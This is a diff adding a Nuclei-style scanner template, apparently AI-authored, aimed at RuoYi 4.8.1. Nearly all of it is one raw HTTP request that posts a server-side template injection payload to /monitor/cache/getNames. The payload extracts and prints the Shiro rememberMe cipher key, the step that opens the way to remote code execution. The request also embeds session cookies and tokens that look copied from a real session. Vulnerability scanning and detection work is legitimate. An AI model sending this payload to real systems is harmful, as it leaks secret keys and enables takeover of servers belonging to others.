@@ -1,0 +1,38 @@
+id: ruoyi4-8-1-ssti-shirokey-rce
+info:
+  name: Ruoyi 4.8.1 SSTI to Shiro Key to RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Exploits a Server-Side Template Injection (SSTI) vulnerability in Ruoyi version 4.8.1 that allows attackers to access the ShiroKey, potentially leading to Remote Code Execution (RCE).
+  tags: ssti, rce, shirokey, ruoyi
+
+http:
+  - raw:
+      - |
+        POST /monitor/cache/getNames HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/javascript, */*; q=0.01
+        Sec-Fetch-Mode: cors
+        sec-ch-ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
+        X-Requested-With: XMLHttpRequest
+        Sec-Fetch-Site: same-origin
+        Accept-Language: zh-CN,zh;q=0.9
+        X-CSRF-Token: JxbJuBkF+1WQAMT3u9i/sqsagEKm7GsXWD+mebzkmhs=
+        Cookie: JSESSIONID=feec2fcc-209b-480c-b2bd-fedc510d91f7; rememberMe=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
+        sec-ch-ua-platform: "Windows"
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Sec-Fetch-Dest: empty
+        Origin: {{BaseURL}}
+        Referer: {{BaseURL}}/monitor/job
+        Accept-Encoding: gzip, deflate, br, zstd
+        sec-ch-ua-mobile: ?0
+        Content-Length: 84
+
+        fragment=__|$${#response.getWriter().print(''.getClass().forName('java.util.Base64').getMethod('getEncoder').invoke(null).encodeToString(@securityManager.rememberMeManager.cipherKey))}|__::.x
+
+    matchers:
+      - type: status
+        status:
+          - 200
